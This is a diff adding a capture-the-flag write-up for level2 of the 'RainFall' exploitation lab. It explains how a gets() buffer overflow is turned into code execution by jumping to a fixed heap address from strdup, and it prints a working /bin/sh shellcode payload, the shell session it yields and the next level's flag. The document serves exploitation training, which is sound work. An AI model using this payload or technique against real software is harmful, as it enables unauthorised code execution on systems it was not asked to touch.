@@ -1,0 +1,29 @@
+The program level2 contains a function `p` which makes a call to `gets`, which makes it unsafe, just like in the previous level, we will use this to execute arbitrary code through a buffer overflow.
+
+Through trial and error with gdb, we see that we need to write the bytes 80-84 to modify eip.
+However, the program checks that we are not pointing anything to the stack, this prevents us from running a standard shellcode injection:
+
+   0x080484fb <+39>:	and    $0xb0000000,%eax
+   0x08048500 <+44>:	cmp    $0xb0000000,%eax
+   0x08048505 <+49>:	jne    0x8048527 <p+83>
+
+At the end of the function `p`, we see a call to strdup, which, thanks to ASLR being disabled always returns the same address: 134520840 or 0x0804A008.
+We can then use the fact that strdup writes in the heap to run our shellcode.
+
+The structure of our input will be as follow:
+- bytes 0-24: Our shellcode program
+- bytes 24-80: Filler bytes to cause the buffer overflow
+- bytes 80-84: The address returned by strdup
+
+Here is the python command we use to generate this input:
+`python -c "print '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x90' * 56 + '\x08\x04\xa0\x08'[::-1]"`
+
+In the end, the final commands we use and their outputs look like this:
+level2@RainFall:~$ (python -c "print '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x90' * 56 + '\x08\x04\xa0\x08'[::-1]"; cat) | ./level2
+1�Ph//shh/bin��PS�ᙰ
+                    ̀���������������������������������������������������
+whoami
+level3
+cd ../level3
+cat .pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
